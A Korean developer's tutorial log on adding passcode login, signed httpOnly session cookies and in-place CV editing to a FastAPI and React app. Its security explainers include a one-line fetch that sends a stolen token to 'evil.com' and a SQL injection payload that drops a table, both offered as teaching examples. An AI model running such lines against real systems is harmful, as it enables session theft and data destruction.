# Step 4 — 내가 로그인해서 수정하기

> MyHub(온라인 이력서) 개발 기록 · 2026-07-28
> 이전 문서: [Step 3 — 화면 붙이기 (React + TypeScript)](step3_react_frontend.md)

---

## 전체 로드맵에서 지금 어디쯤인가

```
[✓  Step 1]  백엔드 ↔ Supabase 연결        완료
[✓  Step 2]  테이블 만들고 데이터 읽기      완료
[✓  Step 3]  화면(프론트엔드) 붙이기        완료
[✅ Step 4]  내가 로그인해서 수정하기       ← 지금 여기
[   Step 5]  ORM 도입 (SQLAlchemy)
```

> 🖥️ 명령어는 **cmd / PowerShell / macOS·Linux** 를 모두 적어뒀습니다.
> **트러블슈팅은 문제가 터지는 단계 바로 아래에 접어두었습니다.** `▸` 를 클릭하면 펼쳐집니다.

---

## 1. 이 단계의 목표

> 🎯 **Supabase 대시보드에 들어가지 않고, 웹에서 이력서를 고칠 수 있게 만드는 것.**

```
[Step 3]  내용을 바꾸려면 → Supabase SQL Editor 에서 UPDATE 실행
[Step 4]  이력서 화면에서 로그인 → 그 자리에서 고치고 → 저장
```

### 네 조각으로 나눠서 진행합니다

| | 하는 일 | 확인 방법 |
|---|---|---|
| **①** | 백엔드 로그인 (비밀코드 → 세션 쿠키) | `/docs` 에서 직접 테스트 |
| **②** | 로그인 입구 + 제자리 편집으로 전환 | 브라우저에서 로그인 |
| **③** | 수정 API + 제자리 편집 | 화면에서 고치고 저장 |
| **④** | 정리 (세션 만료 처리 등) | 쿠키 지우고 저장해보기 |

### 이번 단계에서 처음 등장하는 것

| | |
|---|---|
| **쿠키와 세션** | Step 3의 5.8에서 예고한 `httpOnly`, `SameSite` 가 실전으로 |
| **쓰기 요청** (`PUT`) | 읽기만 하던 앱이 처음으로 데이터를 바꿉니다 |
| **폼** | 입력값 관리, 검증, 저장 중 상태, 되돌리기 |
| **한 화면 두 모드** | 같은 주소에서 읽기 ↔ 편집 전환 |

---

## 2. 완성된 모습

**편집용 페이지를 따로 만들지 않습니다.** 보고 있던 이력서 화면에서 그대로 고칩니다.

```
[로그아웃]  http://localhost:5173
┌──────────────────────────────────────┐
│  백영민                               │
│  백엔드 개발자                         │
│  온라인 이력서를 직접 만들고 있습니다.   │
│  ──────────────────────────────────  │
│  마지막 수정 2026년 7월 28일  관리자 로그인 │  ← 여기를 누르면
└──────────────────────────────────────┘

[로그인]   같은 주소, 같은 화면
┌──────────────────────────────────────┐
│ 편집 모드 — 글자를 눌러 바로 고치세요     │  ← 위에 도구막대가 붙고
│              [되돌리기][저장][로그아웃]  │
├──────────────────────────────────────┤
│  ┌──────────────────────────────┐    │
│  │ 백영민                        │    │  ← 글자가 있던 자리가
│  └──────────────────────────────┘    │     그대로 입력칸이 된다
│  ┌──────────────────────────────┐    │
│  │ 백엔드 개발자                  │    │
│  └──────────────────────────────┘    │
│  ──────────────────────────────────  │
│  ┌──────────────────────────────┐    │
│  │ 온라인 이력서를 직접 만들고... │    │
│  └──────────────────────────────┘    │
└──────────────────────────────────────┘
```

> 💡 **왜 편집 페이지를 따로 두지 않았나요?**
> 별도 페이지를 만들면 **"편집 화면에서 본 모습"과 "실제 공개된 모습"이 달라집니다.** 폼에서는 멀쩡했는데 공개 화면에서 줄바꿈이 이상하다든가 하는 일이 생기죠.
> 같은 화면에서 고치면 **지금 보는 것이 곧 결과물**입니다. 글꼴도 여백도 그대로예요.

`Ctrl + S` 로도 저장됩니다. 저장하지 않은 채로 탭을 닫으려 하면 브라우저가 한 번 물어봅니다.

---

## 3. ① 백엔드 로그인

### 3.1 인증 설계

```
POST   /api/admin/auth/session   비밀코드 보내기  →  쿠키 받음
GET    /api/admin/auth/session   로그인 상태 확인
DELETE /api/admin/auth/session   로그아웃
```

**비밀코드는 로그인할 때 딱 한 번만 씁니다.** 그다음부터는 서명된 쿠키로 인증해요.

> 💡 **왜 매 요청에 비밀코드를 보내면 안 되나요?**
> 로그·프록시·브라우저 기록에 계속 남고, **만료도 폐기도 불가능**해집니다. 한 번 유출되면 비밀코드를 바꾸는 수밖에 없어요. 쿠키는 만료 시간이 있고 로그아웃으로 즉시 무효화됩니다.

### 3.2 패키지와 환경변수

`backend/requirements.txt` 에 추가:

```
itsdangerous
```

`backend/.env` 에 두 줄 추가:

```
ADMIN_PASSCODE='내가정한비밀코드'
SESSION_SECRET=아래명령으로만든64자리
```

`SESSION_SECRET` 만들기:

```
python -c "import secrets; print(secrets.token_hex(32))"
```

설치 후 재시작:

```
pip install -r requirements.txt
uvicorn main:app --reload --port 8080
```

<details>
<summary><b>▸ 트러블슈팅 — <code>KeyError: 'ADMIN_PASSCODE'</code></b></summary>

**원인**
`.env` 에 그 항목이 없습니다.

**이건 의도된 동작입니다.** `os.environ["..."]` 는 값이 없으면 서버를 아예 시작시키지 않습니다. 비밀값이 빠진 채로 조용히 실행되는 것보다, **시작할 때 크게 실패하는 편이 안전**합니다.

**해결**
`backend/.env` 를 열어 두 줄을 추가하세요. `.env.example` 에 양식이 있습니다.

</details>

<details>
<summary><b>▸ 트러블슈팅 — 비밀코드에 특수문자를 넣었더니 안 맞는다</b></summary>

`.env` 파일 형식 때문에 값이 잘리거나 바뀔 수 있습니다. **작은따옴표로 감싸면 전부 해결됩니다.**

```
ADMIN_PASSCODE='a#b$c%d!'
```

입력할 때는 따옴표를 뺀 `a#b$c%d!` 입니다.

**함정 3가지**

| 문자 | 무슨 일이 일어나나 |
|---|---|
| `#` (앞에 공백) | 그 뒤가 **주석으로 잘림** — `abc #def` → 값이 `abc` |
| `${...}` | **다른 환경변수로 치환됨** — `abc${HOME}` → `abcC:\Users\...` |
| 한글·이모지 | `secrets.compare_digest` 가 **비ASCII 문자열 비교를 거부**함 |

세 번째는 코드에서 처리했습니다. 문자열이 아니라 바이트로 비교하면 됩니다.

```python
if not secrets.compare_digest(
    body.passcode.encode("utf-8"), ADMIN_PASSCODE.encode("utf-8")
):
```

> `%` 는 `.env` 에서 아무 의미가 없어 안전합니다. (Windows cmd 의 `%VAR%` 는 cmd 에 직접 칠 때만 해당됩니다.)

</details>

### 3.3 쿠키 설정

```python
from starlette.middleware.sessions import SessionMiddleware

app.add_middleware(
    SessionMiddleware,
    secret_key=SESSION_SECRET,
    session_cookie="myhub_session",
    max_age=60 * 60 * 12,   # 12시간
    same_site="lax",
    https_only=False,       # 배포할 때 True
)
```

### 3.4 문지기

```python
def require_admin(request: Request) -> None:
    """관리자 전용 엔드포인트에 붙이는 문지기.

    이 함수 하나만 바꾸면 나중에 인증 방식을 통째로 교체할 수 있다.
    """
    if not request.session.get("admin"):
        raise HTTPException(status_code=401, detail="로그인이 필요합니다.")
```

```python
@app.get("/api/admin/profile", dependencies=[Depends(require_admin)])
```

**`dependencies=[Depends(require_admin)]` 한 줄**을 붙이면 그 주소는 로그인 필수가 됩니다.

나중에 GitHub 로그인 등으로 바꾸고 싶어지면 **`require_admin` 함수 하나만** 갈아끼우면 됩니다. 나머지 코드는 손대지 않아요.

### 3.5 로그인 처리

```python
@app.post("/api/admin/auth/session", response_model=SessionResponse)
def login(body: LoginRequest, request: Request):
    global _login_fail_count, _login_locked_until

    now = time.monotonic()
    if now < _login_locked_until:
        raise HTTPException(status_code=429, detail="시도가 너무 많습니다...")

    if not secrets.compare_digest(
        body.passcode.encode("utf-8"), ADMIN_PASSCODE.encode("utf-8")
    ):
        _login_fail_count += 1
        if _login_fail_count >= LOGIN_MAX_ATTEMPTS:
            _login_locked_until = now + LOGIN_LOCK_SECONDS
            _login_fail_count = 0
        raise HTTPException(status_code=401, detail="비밀코드가 올바르지 않습니다.")

    _login_fail_count = 0
    request.session["admin"] = True
    return SessionResponse(authenticated=True)
```

<details>
<summary><b>▸ <code>secrets.compare_digest</code> 는 왜 쓰나요? <code>==</code> 로 하면 안 되나요?</b></summary>

`==` 는 **다른 글자가 나오는 즉시 멈춥니다.**

```
정답: "abcdef"

"xxxxxx" 와 비교 → 1글자 만에 끝     (빠름)
"abcdex" 와 비교 → 6글자까지 감      (아주 조금 느림)
```

이 시간 차이를 수천 번 측정하면 **한 글자씩 맞춰나갈 수 있습니다.** 이걸 타이밍 공격이라고 합니다.

`compare_digest` 는 **항상 끝까지 비교**해서 걸리는 시간이 일정합니다. 한 줄 바꾸는 것으로 이 공격이 사라집니다.

</details>

<details>
<summary><b>▸ 시도 횟수 제한이 왜 필요한가요?</b></summary>

비밀코드가 6자리라면 경우의 수가 얼마 안 됩니다. **컴퓨터는 초당 수천 번 시도할 수 있어요.**

```python
LOGIN_MAX_ATTEMPTS = 5
LOGIN_LOCK_SECONDS = 60
```

5번 틀리면 60초 잠급니다. 초당 수천 번이 **분당 5번**으로 줄어들면, 6자리 코드를 다 시도하는 데 수백 년이 걸립니다.

> 지금은 서버 메모리에 숫자를 세는 방식이라 서버를 재시작하면 초기화됩니다. 프로토타입에는 충분하지만, 여러 대로 늘리면 공유 저장소(Redis 등)가 필요합니다.

</details>

### 3.6 `/docs` 에서 테스트

**http://127.0.0.1:8080/docs** 에서 순서대로:

| | 요청 | 기대 결과 |
|---|---|---|
| ① | `GET /api/admin/profile` | `401 로그인이 필요합니다` |
| ② | `POST /api/admin/auth/session` (비밀코드) | `200 {"authenticated": true}` |
| ③ | `GET /api/admin/profile` | `200 {"profile": {...}}` |
| ④ | `DELETE /api/admin/auth/session` | `200 {"authenticated": false}` |
| ⑤ | `GET /api/admin/profile` | `401` 다시 |
| ⑥ | 틀린 비밀코드 6번 | 6회째부터 `429` |

**③에서 아무것도 안 바꿨는데 통과합니다.** 브라우저가 ②에서 받은 쿠키를 자동으로 붙여 보냈기 때문입니다.

---

## 4. 쿠키 — 이번 단계의 핵심 개념

### 4.1 쿠키가 뭔가

서버가 브라우저에게 주는 **쪽지**입니다.

> "이거 갖고 있다가, 다음에 나한테 올 때 같이 보여줘."

브라우저는 이 쪽지를 **알아서 저장하고, 알아서 붙여 보냅니다.** 우리 코드에는 토큰을 저장하거나 꺼내는 부분이 한 줄도 없습니다.

```ts
export async function login(passcode: string) {
  const { data } = await client.POST('/api/admin/auth/session', {
    body: { passcode },
  })
  return data          // ← 받아서 어딘가 넣는 코드가 없다
}
```

### 4.2 왜 새로고침해도 로그인이 유지되나

이게 이 단계에서 가장 재미있는 지점입니다.

```
새로고침
  → React 가 기억하던 것은 전부 사라짐   (authenticated 값도 초기화)
  → 하지만 쿠키는 브라우저가 보관 중
  → readSession() 호출 시 쿠키가 자동으로 따라감
  → 서버: "응, 로그인된 사람 맞아"
  → 화면 복구
```

**화면의 기억은 날아가도, 브라우저의 쪽지는 남아 있습니다.** 그래서 로그인 상태가 이어집니다.

브라우저를 완전히 껐다 켜도 마찬가지입니다 — `max_age`(우리는 12시간) 안이라면요.

### 4.3 우리가 준 4가지 보호 장치

| 장치 | 막아주는 것 |
|---|---|
| `httpOnly` (기본값) | **XSS 로 세션을 훔쳐가는 것** |
| `same_site="lax"` | **CSRF — 남의 사이트에서 내 이름으로 요청 보내기** |
| `https_only` | 중간에서 쪽지를 가로채는 것 (배포 시 필수) |
| 서명 (`secret_key`) | 쪽지 내용을 위조하는 것 |

<details>
<summary><b>▸ XSS 가 뭔가요?</b></summary>

**Cross-Site Scripting** — 내 페이지에서 **남의 자바스크립트가 실행되는** 사고입니다.

예를 들어 어떤 입력값에 `<script>...</script>` 를 넣었는데 그게 그대로 화면에 출력되면, 그 스크립트가 **다른 방문자의 브라우저에서 실행**됩니다.

그때 세션 정보가 자바스크립트로 읽히면 이렇게 털립니다.

```js
// localStorage 에 토큰을 넣었다면 — 한 줄이면 끝
fetch('https://evil.com/steal?t=' + localStorage.getItem('token'))

// httpOnly 쿠키는 — 애초에 보이지 않는다
document.cookie    // 우리 세션 쿠키는 여기 안 나옴
```

**`httpOnly` 는 "XSS 가 나더라도 세션만은 지킨다"는 마지막 방어선**입니다.

> React 는 화면에 넣는 값을 자동으로 이스케이프해서 XSS 를 기본적으로 막아줍니다. 다만 `dangerouslySetInnerHTML` 을 쓰면 그 보호가 풀립니다. 이름이 무섭게 지어진 이유예요.

</details>

<details>
<summary><b>▸ CSRF 가 뭔가요?</b></summary>

**Cross-Site Request Forgery** — 로그인된 상태를 악용해 **내 이름으로 요청을 보내는** 공격입니다.

1. 내가 이력서 관리자에 로그인해 둠
2. 악성 사이트에 들어감
3. 그 사이트가 몰래 `내사이트/api/admin/profile` 에 요청을 보냄
4. 브라우저가 **쿠키를 자동으로 붙여** 보냄 ← 자동 전송의 어두운 면
5. 서버는 "로그인한 사람이네" 하고 처리

`SameSite=Lax` 는 **다른 사이트에서 시작된 요청에는 쿠키를 안 붙입니다.** 그래서 4번이 성립하지 않습니다.

> 쿠키의 "자동으로 붙는다"는 편리함이 곧 CSRF 의 원인이고, `SameSite` 가 그 부작용을 막는 장치입니다. **편리함과 위험이 같은 뿌리에서 나옵니다.**

</details>

### 4.4 `localStorage` 와 비교

| | `httpOnly` 쿠키 (우리) | localStorage |
|---|---|---|
| 자바스크립트 접근 | ❌ 불가 | ✅ 가능 |
| XSS 발생 시 | 세션은 지켜짐 | **한 줄로 탈취** |
| 요청에 붙이기 | 브라우저가 자동 | 매번 직접 헤더에 |
| CSRF 위험 | 있음 → `SameSite` 로 차단 | 없음 (자동 전송이 아니므로) |
| 새로고침 후 | 유지 | 유지 |

**둘 다 트레이드오프가 있습니다.** 다만 XSS 는 어떤 사이트에서든 날 수 있는 반면 CSRF 는 `SameSite` 한 줄로 막히므로, **`httpOnly` 쿠키 + `SameSite`** 조합이 더 안전한 기본값입니다.

### 4.5 정정 — Preflight 는 일어나지 않았습니다

Step 3 문서에서 *"Step 4에서 `PUT` 을 보내는 순간 Preflight 를 만나게 된다"* 고 썼는데 **틀렸습니다.**

프록시 덕분에 브라우저 입장에서는 `PUT` 도 **같은 출처(5173)** 로 나갑니다. 같은 출처에는 CORS 검사 자체가 없으니 예비 요청도 없어요.

프록시 없이 8080 으로 직접 요청하는 구조였다면 지금 딱 만났을 문제입니다. **프록시가 조용히 막아준 두 번째 문제**였던 셈이고, Step 3 문서는 수정해뒀습니다.

### 4.6 배포할 때 반드시 바꿀 것

```diff
-    https_only=False,
+    https_only=True,
```

`Secure` 없이 http 로 다니면 같은 와이파이에 있는 사람이 쪽지를 그대로 볼 수 있습니다.

---

## 5. ② 로그인 화면

### 5.1 라우터 설치

```
npm i react-router
```

### 5.2 타입 재생성

백엔드에 주소 3개가 새로 생겼으니 반드시 필요합니다.

```
npm run gen:api
```

<details>
<summary><b>▸ 트러블슈팅 — <code>'/api/admin/auth/session' is not assignable to parameter of type ...</code></b></summary>

**증상**
```
Argument of type '"/api/admin/auth/session"' is not assignable to parameter
of type '"/" | "/api/health" | "/api/profile"'
```

**원인**
백엔드에는 그 주소가 있는데, **프론트엔드의 타입이 아직 옛날 것**입니다.

**해결**
```
npm run gen:api
```

> 이건 **타입 검사가 제대로 동작한다는 증거**이기도 합니다. 주소를 오타 냈을 때와 똑같은 방식으로 잡아준 거예요.

</details>

### 5.3 화면은 하나, 부품으로 나눕니다

```
frontend/src/
├── api/
│   ├── schema.d.ts      자동 생성
│   ├── types.ts         이름만 꺼냄
│   └── client.ts        백엔드 호출
├── components/          ★ 새로 생김 — 편집 장치
│   ├── Editable.tsx     제자리 입력칸 (글꼴을 물려받는다)
│   ├── EditBar.tsx      위쪽 도구막대 (저장 · 되돌리기 · 로그아웃)
│   └── LoginPanel.tsx   푸터의 로그인 입구
├── routes/
│   └── Cv.tsx           ★ 읽기와 편집이 한 화면
├── App.tsx              주소 → 화면 연결
└── index.css
```

`App.tsx` 는 아주 작습니다.

```tsx
import { BrowserRouter, Navigate, Route, Routes } from 'react-router'
import Cv from './routes/Cv'

function App() {
  return (
    <BrowserRouter>
      <Routes>
        <Route path="/" element={<Cv />} />
        {/* 예전 주소는 남겨두고 이력서로 보낸다 */}
        <Route path="/admin" element={<Navigate to="/" replace />} />
      </Routes>
    </BrowserRouter>
  )
}
```

#### 읽기 모드와 편집 모드가 같은 상자를 씁니다

이게 "글자가 안 움직이는" 비결입니다.

```css
.field,
.editable {
  display: block;
  margin: -0.2em -0.45em;   /* 테두리와 여백만큼 바깥으로 당긴다 */
  padding: 0.2em 0.45em;
  border: 1px dashed transparent;
}
```

읽기용 `<span class="field">` 와 편집용 `<input class="editable">` 이 **똑같은 크기의 상자**를 쓰고, 그만큼 바깥으로 당겨 놓았습니다. 그래서 편집칸이 나타나도 글자가 제자리에 있습니다.

**"안 움직이게 잘 맞춘 것"이 아니라, 원래 같은 상자라서 못 움직입니다.**

그리고 입력칸은 자기 글꼴을 정하지 않습니다.

```css
.editable {
  font: inherit;      /* 감싸는 태그에서 물려받는다 */
  color: inherit;
}
```

`<h1>` 안에 넣으면 제목처럼, 문단 안에 넣으면 본문처럼 보입니다.

### 5.4 화면 상태가 3갈래입니다

```ts
const [authenticated, setAuthenticated] = useState<boolean | null>(null)
```

| 값 | 화면 |
|---|---|
| `null` | "확인 중..." — 서버에 아직 안 물어봄 |
| `false` | 로그인 폼 |
| `true` | 편집 화면 |

> 💡 **`null` 을 빼고 `false` 로 시작하면 어떻게 되나요?**
> 새로고침할 때마다 **로그인 폼이 잠깐 번쩍입니다.** 이미 로그인돼 있는데도요. 서버에 물어보기 전에는 "모른다"가 정답이고, 그걸 표현할 값이 필요합니다.

### 5.5 `event.preventDefault()`

```ts
async function handleSubmit(event: FormEvent) {
  event.preventDefault()
```

HTML 폼은 원래 제출하면 **페이지를 통째로 새로고침**합니다. 그 기본 동작을 막아야 자바스크립트로 처리할 수 있어요. 빼먹으면 화면이 깜빡이면서 입력이 날아갑니다.

<details>
<summary><b>▸ 트러블슈팅 — 로그인은 되는데 새로고침하면 풀린다</b></summary>

**확인 1 — 시크릿/프라이빗 모드인가?**
일부 브라우저는 창을 닫으면 쿠키를 지웁니다. 새로고침은 괜찮아야 하지만, 확장 프로그램이 개입할 수 있습니다.

**확인 2 — 쿠키가 실제로 저장됐나?**
F12 → **Application → Cookies → `http://localhost:5173`** 에서 `myhub_session` 이 보이는지 확인하세요.

**확인 3 — 주소가 왔다갔다 하지 않는가?**
`localhost:5173` 에서 로그인하고 `127.0.0.1:5173` 으로 들어가면 **다른 사이트로 취급되어 쿠키가 안 갑니다.** Step 3의 5.3에서 다룬 그 문제입니다. 하나로 통일하세요.

</details>

---

## 6. ③ 수정 기능

### 6.1 읽는 타입과 쓰는 타입은 다릅니다

```python
class Profile(BaseModel):        # 읽기 — 서버가 내보내는 것
    id: int
    full_name: str
    headline: str
    summary: str | None
    updated_at: datetime


class ProfileUpdate(BaseModel):  # 쓰기 — 클라이언트가 보내는 것
    full_name: str = Field(min_length=1, max_length=100)
    headline: str = Field(min_length=1, max_length=200)
    summary: str | None = Field(default=None, max_length=2000)
```

**`id` 와 `updated_at` 이 `ProfileUpdate` 에 없습니다.** 클라이언트가 정할 값이 아니니까요.

보낼 수 있게 두면 `updated_at` 을 조작하거나 `id` 를 바꿔 **다른 행을 건드릴 수 있습니다.** DTO 를 나눠서 "보낼 수 있는 것"을 애초에 제한한 겁니다.

이 구분은 그대로 TypeScript 타입으로 내려옵니다.

```ts
export type Profile = ProfileResponse['profile']
export type ProfileUpdate =
  paths['/api/admin/profile']['put']['requestBody']['content']['application/json']
```

### 6.2 SQL 인젝션 — 이번 단계에서 가장 중요합니다

```python
cur.execute(
    """
    update public.profile
       set full_name  = %(full_name)s,
           headline   = %(headline)s,
           summary    = %(summary)s,
           updated_at = now()
     where id = (select id from public.profile order by id limit 1)
 returning id, full_name, headline, summary, updated_at
    """,
    body.model_dump(),
)
```

`%(full_name)s` 는 **"여기에 값이 들어간다"는 자리 표시**일 뿐입니다. 값은 SQL 문장과 **별도로** 전달돼요.

문자열을 이어 붙였다면 이렇게 됩니다.

```python
# ❌ 절대 이렇게 하면 안 됩니다
f"update public.profile set full_name = '{name}'"
```

누가 이름 칸에 이렇게 입력하면:

```
'; drop table public.profile; --
```

완성된 문장이 이렇게 됩니다.

```sql
update public.profile set full_name = ''; drop table public.profile; --'
```

**테이블이 통째로 사라집니다.** 자리 표시를 쓰면 저 문자열은 그냥 "이상한 이름"으로 저장될 뿐, 명령으로 해석되지 않습니다.

> 이건 프로그래밍에서 가장 오래되고 가장 흔한 보안 사고입니다. **문자열을 이어 붙여서 SQL 을 만들지 않는다** — 이 한 줄만 지키면 됩니다.

> ✅ **이 걱정은 Step 5 에서 구조적으로 사라집니다.**
> SQLAlchemy ORM 을 도입하면 SQL 문을 우리가 쓰지 않습니다. 값은 항상 바인딩으로 전달되므로 **실수로 문자열을 이어 붙일 방법 자체가 없어집니다.**
>
> ```python
> entity.full_name = body.full_name   # UPDATE 문은 SQLAlchemy 가 만든다
> db.commit()
> ```
>
> 다만 `text()` 로 raw SQL 을 직접 쓸 때는 여전히 이 규칙이 적용됩니다. **ORM 은 기본값을 안전하게 만들어줄 뿐, 면제권이 아닙니다.**

### 6.3 `returning` — 쿼리 한 번으로 끝

```sql
update ... set ..., updated_at = now()
 where ...
returning id, full_name, headline, summary, updated_at
```

수정하고 나서 다시 `select` 로 읽어올 필요가 없습니다. **PostgreSQL 이 수정된 결과를 바로 돌려줍니다.**

그래서 저장 직후 화면의 "마지막 수정" 시각이 정확히 갱신됩니다 — 서버가 `now()` 로 찍은 진짜 값이니까요.

### 6.4 검증을 두 번 합니다 (일부러)

```python
full_name: str = Field(min_length=1, max_length=100)
```
```tsx
<Editable value={draft.full_name} maxLength={100} ... />
```

| | 목적 |
|---|---|
| **브라우저** (`maxLength`, `required`) | 사용자 편의 — 즉시 알려주기 |
| **서버** (`Field`) | **진짜 방어선** |

브라우저 검증은 개발자도구로 **1초면 우회됩니다.** 그래서 서버 검증이 진짜고, 브라우저 검증은 친절함일 뿐입니다.

**서버만 있어도 안전하고, 브라우저만 있으면 위험합니다.**

Pydantic 이 거부하면 FastAPI 가 **어느 항목이 왜 틀렸는지까지 담아 422 로** 자동 응답합니다. 우리가 쓴 코드는 `Field(...)` 한 줄뿐이고요.

---

## 7. ④ 정리

### 7.1 세션이 만료되면 로그인 화면으로

**고치기 전의 문제** — 12시간 뒤 저장을 누르면:

```
빨간 글씨: "로그인이 필요합니다."
그런데 화면은 편집 폼 그대로 → 몇 번을 눌러도 계속 실패
```

**원인은 에러에 상태 코드가 없었다는 것**입니다. 메시지 문자열만으로는 "401이면 로그인 화면으로" 같은 판단을 할 수 없습니다.

```ts
export class ApiError extends Error {
  status: number

  constructor(message: string, status: number) {
    super(message)
    this.name = 'ApiError'
    this.status = status
  }
}
```

```ts
function handleError(e: unknown) {
  if (e instanceof ApiError && e.status === 401) {
    setAuthenticated(false)          // ← 로그인 화면으로 되돌림
    setError('세션이 만료되었습니다. 다시 로그인해 주세요.')
    return
  }
  setError((e as Error).message)
}
```

**테스트 방법** — 12시간 기다릴 필요 없습니다.

1. 이력서 화면에서 로그인 후 **F12 → Application → Cookies → `myhub_session` 삭제**
2. 아무 글자나 고치고 저장 클릭
3. 읽기 모드로 돌아가며 "세션이 만료되었습니다" 표시

### 7.2 `useEffect` 의 정리(cleanup) 함수

저장 알림이 3초 뒤 스스로 사라지게 했습니다.

```ts
useEffect(() => {
  if (!saved) return

  const timer = setTimeout(() => setSaved(null), 3000)
  return () => clearTimeout(timer)   // ← 정리
}, [saved])
```

**`useEffect` 가 함수를 돌려주면 그게 정리용**입니다. 다음에 이 효과가 다시 실행되기 직전이나, 화면이 사라질 때 호출됩니다.

없으면 저장을 연달아 눌렀을 때 **타이머가 여러 개 쌓여서** 알림이 엉뚱한 타이밍에 사라집니다.

> 타이머, 이벤트 리스너, 구독처럼 **"켜면 꺼야 하는 것"** 은 전부 이 정리 함수에서 끕니다.

### 7.3 상태관리 라이브러리는 아직 필요 없습니다

현재 API 호출 6개, 화면 2개.

| 판단 기준 | 지금 |
|---|---|
| 여러 화면이 같은 데이터를 공유하나? | ❌ 각자 자기 것만 |
| 저장 후 다른 화면을 갱신해야 하나? | ❌ 공개 화면은 새 탭에서 새로고침 |
| 같은 데이터를 반복해서 부르나? | ❌ 화면당 1회 |

**셋 중 하나라도 ✅ 가 되면 그때 TanStack Query** 를 넣습니다. Zustand 는 여전히 해당 없습니다 — 우리에게 부족한 건 **서버 데이터 관리**지 전역 변수가 아니거든요.

---

## 8. 이번에 배운 개념

| 용어 | 한 줄 설명 |
|---|---|
| **쿠키** | 서버가 브라우저에게 주는 쪽지. 브라우저가 자동 저장·자동 전송 |
| **세션** | "이 사람은 로그인했다"는 서버 쪽 기억. 우리는 서명된 쿠키에 담음 |
| **`httpOnly`** | 자바스크립트가 쿠키를 못 읽게 함 → XSS 방어 |
| **`SameSite=Lax`** | 다른 사이트발 요청에 쿠키를 안 붙임 → CSRF 방어 |
| **`Secure`** | HTTPS 에서만 쿠키 전송 (배포 시 필수) |
| **XSS** | 내 페이지에서 남의 자바스크립트가 실행되는 사고 |
| **CSRF** | 로그인된 상태를 악용해 내 이름으로 요청을 보내는 공격 |
| **타이밍 공격** | 비교에 걸리는 시간 차이로 비밀값을 알아내는 것 |
| **SQL 인젝션** | 입력값이 SQL 명령으로 해석되는 사고. 자리 표시로 방어 |
| **파라미터 바인딩** | `%(name)s` — 값을 SQL 문장과 분리해 전달하는 것 |
| **`RETURNING`** | 수정·삭제한 행을 그 쿼리에서 바로 돌려받는 PostgreSQL 기능 |
| **`Depends`** | FastAPI 에서 "이 엔드포인트를 실행하기 전에 이걸 먼저" 지정 |
| **정리 함수 (cleanup)** | `useEffect` 가 돌려주는 함수. 타이머·구독을 끄는 곳 |

---

## 9. 다음 단계 (Step 5)

> 🎯 **SQL 을 직접 쓰지 않고, 파이썬 클래스로 데이터베이스를 다룹니다.**

지금 백엔드에는 raw SQL 이 곳곳에 있습니다. **SQLAlchemy ORM** 을 도입해 전부 걷어냅니다.

| | 지금 (Step 4) | Step 5 |
|---|---|---|
| 테이블 정의 | SQL Editor 에서 `create table` | **파이썬 클래스** (엔티티) |
| 테이블 생성 | 손으로 SQL 실행 | **서버 시작 시 자동** |
| 조회 | `cur.execute("select ...")` | `select(models.Profile)` |
| 수정 | `update ... set ...` | `entity.full_name = "..."` |
| `updated_at` | UPDATE 문에 직접 적음 | 엔티티에 선언, 자동 갱신 |
| SQL 인젝션 | 자리 표시를 꼼꼼히 써야 함 | **걱정거리 자체가 사라짐** |

**6.2 에서 다룬 SQL 인젝션 위험이 구조적으로 해소되는 것**이 특히 중요합니다. ORM 은 값을 항상 바인딩으로 넘기므로, 실수로 문자열을 이어 붙일 방법이 없습니다.

파일 구조도 이렇게 나뉩니다.

```
backend/
├── main.py       엔드포인트
├── db.py         엔진 · 세션 · Base
├── models.py     ORM 엔티티   (테이블의 모양)
├── schemas.py    Pydantic DTO (API 의 모양)
└── init_db.py    시작 시 테이블 자동 생성 + seed
```

지금까지 `models` 와 `schemas` 가 한 파일에 섞여 있었는데, **원래 다른 개념**이라 분리하면 훨씬 명확해집니다.

← 이전: [Step 3 — 화면 붙이기 (React + TypeScript)](step3_react_frontend.md)
다음 → [Step 5 — ORM 도입 (SQLAlchemy)](step5_orm_sqlalchemy.md)
